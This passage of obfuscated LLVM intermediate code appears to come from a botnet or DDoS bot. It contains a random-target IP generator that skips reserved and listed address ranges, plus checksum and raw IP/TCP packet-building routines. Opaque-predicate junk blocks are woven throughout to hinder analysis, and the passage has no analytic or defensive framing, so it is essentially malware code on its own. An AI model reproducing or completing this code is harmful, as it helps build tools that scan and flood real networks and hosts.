  %1184 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1185 = zext i8 %1184 to i32
  %1186 = call i32 (i8*, i8*, ...) @szprintf(i8* %1177, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %1179, i32 %1181, i32 %1183, i32 %1185)
  %1187 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %1188 = call i32 @inet_addr(i8* %1187) #2
  store i32 %1188, i32* %1, align 4
  br label %1189

; <label>:1189:                                   ; preds = %1175, %27
  %1190 = load i32, i32* %1, align 4
  ret i32 %1190

originalBBalteredBB:                              ; preds = %originalBB, %7
  %1191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %1192 = zext i8 %1191 to i32
  %1193 = icmp slt i32 %1192, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %1194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1195 = zext i8 %1194 to i32
  %1196 = icmp sle i32 %1195, 127
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %1197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1198 = zext i8 %1197 to i32
  %1199 = icmp eq i32 %1198, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %140
  %1200 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1201 = zext i8 %1200 to i32
  %1202 = icmp eq i32 %1201, 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %164
  %1203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1204 = zext i8 %1203 to i32
  %1205 = icmp eq i32 %1204, 88
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %196
  %1206 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1207 = zext i8 %1206 to i32
  %1208 = icmp eq i32 %1207, 198
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %224
  %1209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1210 = zext i8 %1209 to i32
  %1211 = icmp eq i32 %1210, 198
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %244
  %1212 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1213 = zext i8 %1212 to i32
  %1214 = icmp eq i32 %1213, 51
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %276
  %1215 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = icmp eq i32 %1216, 113
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %316
  %1218 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1219 = zext i8 %1218 to i32
  %1220 = icmp eq i32 %1219, 49
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %344
  %1221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1222 = zext i8 %1221 to i32
  %1223 = icmp eq i32 %1222, 190
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %368
  %1224 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1225 = zext i8 %1224 to i32
  %1226 = icmp eq i32 %1225, 62
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %392
  %1227 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1228 = zext i8 %1227 to i32
  %1229 = icmp eq i32 %1228, 185
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %416
  %1230 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1231 = zext i8 %1230 to i32
  %1232 = icmp eq i32 %1231, 188
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %436
  %1233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1234 = zext i8 %1233 to i32
  %1235 = icmp eq i32 %1234, 185
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %456
  %1236 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1237 = zext i8 %1236 to i32
  %1238 = icmp eq i32 %1237, 61
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %492
  %1239 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1240 = zext i8 %1239 to i32
  %1241 = icmp eq i32 %1240, 185
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %512
  %1242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1243 = zext i8 %1242 to i32
  %1244 = icmp eq i32 %1243, 11
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %532
  %1245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1246 = zext i8 %1245 to i32
  %1247 = icmp eq i32 %1246, 147
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %576
  %1248 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1249 = zext i8 %1248 to i32
  %1250 = icmp eq i32 %1249, 63
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %596
  %1251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1252 = zext i8 %1251 to i32
  %1253 = icmp eq i32 %1252, 141
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %620
  %1254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1255 = zext i8 %1254 to i32
  %1256 = icmp eq i32 %1255, 69
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %656
  %1257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1258 = zext i8 %1257 to i32
  %1259 = icmp eq i32 %1258, 244
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %680
  %1260 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1261 = zext i8 %1260 to i32
  %1262 = icmp eq i32 %1261, 197
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %700
  %1263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1264 = zext i8 %1263 to i32
  %1265 = icmp eq i32 %1264, 128
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %736
  %1266 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1267 = zext i8 %1266 to i32
  %1268 = icmp eq i32 %1267, 208
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %760
  %1269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1270 = zext i8 %1269 to i32
  %1271 = icmp eq i32 %1270, 173
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %800
  %1272 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1273 = zext i8 %1272 to i32
  %1274 = icmp eq i32 %1273, 192
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %820
  %1275 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1276 = zext i8 %1275 to i32
  %1277 = icmp eq i32 %1276, 187
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %840
  %1278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1279 = zext i8 %1278 to i32
  %1280 = icmp eq i32 %1279, 113
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %864
  %1281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1282 = zext i8 %1281 to i32
  %1283 = icmp eq i32 %1282, 204
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %908
  %1284 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1285 = zext i8 %1284 to i32
  %1286 = icmp eq i32 %1285, 192
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %948
  %1287 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1288 = zext i8 %1287 to i32
  %1289 = icmp eq i32 %1288, 72
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %968
  %1290 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1291 = zext i8 %1290 to i32
  %1292 = icmp eq i32 %1291, 208
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1000
  %1293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1294 = zext i8 %1293 to i32
  %1295 = icmp eq i32 %1294, 48
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1020
  %1296 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1297 = zext i8 %1296 to i32
  %1298 = icmp eq i32 %1297, 93
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1056
  %1299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1300 = zext i8 %1299 to i32
  %1301 = icmp eq i32 %1300, 174
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1104
  %1302 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1303 = zext i8 %1302 to i32
  %1304 = icmp eq i32 %1303, 248
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1132
  %1305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1306 = zext i8 %1305 to i32
  %1307 = icmp eq i32 %1306, 248
  br label %originalBB150
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #13
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.53
  %23 = load i32, i32* @y.54
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #13
  %34 = load i32, i32* %30, align 4
  %_ = sub i32 %33, %34
  %gen = mul i32 %_, %34
  %_1 = sub i32 0, %33
  %gen2 = add i32 %_1, %34
  %_3 = sub i32 %33, %34
  %gen4 = mul i32 %_3, %34
  %_5 = shl i32 %33, %34
  %_6 = sub i32 0, %33
  %gen7 = add i32 %_6, %34
  %_8 = sub i32 0, %33
  %gen9 = add i32 %_8, %34
  %_10 = shl i32 %33, %34
  %_11 = sub i32 0, %33
  %gen12 = add i32 %_11, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_13 = sub i32 0, %38
  %gen14 = add i32 %_13, -1
  %_15 = sub i32 %38, -1
  %gen16 = mul i32 %_15, -1
  %39 = xor i32 %38, -1
  %_17 = sub i32 %37, %39
  %gen18 = mul i32 %_17, %39
  %_19 = sub i32 0, %37
  %gen20 = add i32 %_19, %39
  %_21 = shl i32 %37, %39
  %_22 = sub i32 0, %37
  %gen23 = add i32 %_22, %39
  %40 = and i32 %37, %39
  %_24 = shl i32 %36, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %25, %2
  %7 = load i32, i32* @x.55
  %8 = load i32, i32* @y.56
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  %17 = load i32, i32* @x.55
  %18 = load i32, i32* @y.56
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %34

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i16*, i16** %3, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %3, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %5, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %5, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %4, align 4
  br label %6

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %34
  %38 = load i16*, i16** %3, align 8
  %39 = bitcast i16* %38 to i8*
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i64
  %42 = load i64, i64* %5, align 8
  %43 = add i64 %42, %41
  store i64 %43, i64* %5, align 8
  br label %44

; <label>:44:                                     ; preds = %37, %34
  br label %45

; <label>:45:                                     ; preds = %originalBBpart231, %44
  %46 = load i32, i32* @x.55
  %47 = load i32, i32* @y.56
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %5, align 8
  %55 = lshr i64 %54, 16
  %56 = icmp ne i64 %55, 0
  %57 = load i32, i32* @x.55
  %58 = load i32, i32* @y.56
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br i1 %56, label %65, label %87

; <label>:65:                                     ; preds = %originalBBpart28
  %66 = load i32, i32* @x.55
  %67 = load i32, i32* @y.56
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %65
  %74 = load i64, i64* %5, align 8
  %75 = and i64 %74, 65535
  %76 = load i64, i64* %5, align 8
  %77 = lshr i64 %76, 16
  %78 = add i64 %75, %77
  store i64 %78, i64* %5, align 8
  %79 = load i32, i32* @x.55
  %80 = load i32, i32* @y.56
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart231, label %originalBB10alteredBB

originalBBpart231:                                ; preds = %originalBB10
  br label %45

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = load i32, i32* @x.55
  %89 = load i32, i32* @y.56
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %87
  %96 = load i64, i64* %5, align 8
  %97 = xor i64 %96, -1
  %98 = trunc i64 %97 to i16
  %99 = load i32, i32* @x.55
  %100 = load i32, i32* @y.56
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart249, label %originalBB33alteredBB

originalBBpart249:                                ; preds = %originalBB33
  ret i16 %98

originalBBalteredBB:                              ; preds = %originalBB, %6
  %107 = load i32, i32* %4, align 4
  %108 = icmp sgt i32 %107, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %109 = load i64, i64* %5, align 8
  %_ = shl i64 %109, 16
  %_2 = shl i64 %109, 16
  %_3 = shl i64 %109, 16
  %_4 = sub i64 %109, 16
  %gen = mul i64 %_4, 16
  %_5 = sub i64 %109, 16
  %gen6 = mul i64 %_5, 16
  %110 = lshr i64 %109, 16
  %111 = icmp ne i64 %110, 0
  br label %originalBB1

originalBB10alteredBB:                            ; preds = %originalBB10, %65
  %112 = load i64, i64* %5, align 8
  %113 = and i64 %112, 65535
  %114 = load i64, i64* %5, align 8
  %_11 = sub i64 0, %114
  %gen12 = add i64 %_11, 16
  %_13 = sub i64 %114, 16
  %gen14 = mul i64 %_13, 16
  %_15 = sub i64 0, %114
  %gen16 = add i64 %_15, 16
  %_17 = sub i64 0, %114
  %gen18 = add i64 %_17, 16
  %115 = lshr i64 %114, 16
  %_19 = shl i64 %113, %115
  %_20 = shl i64 %113, %115
  %_21 = sub i64 0, %113
  %gen22 = add i64 %_21, %115
  %_23 = shl i64 %113, %115
  %_24 = sub i64 0, %113
  %gen25 = add i64 %_24, %115
  %_26 = sub i64 0, %113
  %gen27 = add i64 %_26, %115
  %_28 = sub i64 0, %113
  %gen29 = add i64 %_28, %115
  %116 = add i64 %113, %115
  store i64 %116, i64* %5, align 8
  br label %originalBB10

originalBB33alteredBB:                            ; preds = %originalBB33, %87
  %117 = load i64, i64* %5, align 8
  %_34 = shl i64 %117, -1
  %_35 = sub i64 0, %117
  %gen36 = add i64 %_35, -1
  %_37 = sub i64 %117, -1
  %gen38 = mul i64 %_37, -1
  %_39 = sub i64 0, %117
  %gen40 = add i64 %_39, -1
  %_41 = sub i64 %117, -1
  %gen42 = mul i64 %_41, -1
  %_43 = sub i64 %117, -1
  %gen44 = mul i64 %_43, -1
  %_45 = shl i64 %117, -1
  %_46 = sub i64 0, %117
  %gen47 = add i64 %_46, -1
  %118 = xor i64 %117, -1
  %119 = trunc i64 %118 to i16
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #2
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.57
  %54 = load i32, i32* @y.58
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #2
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
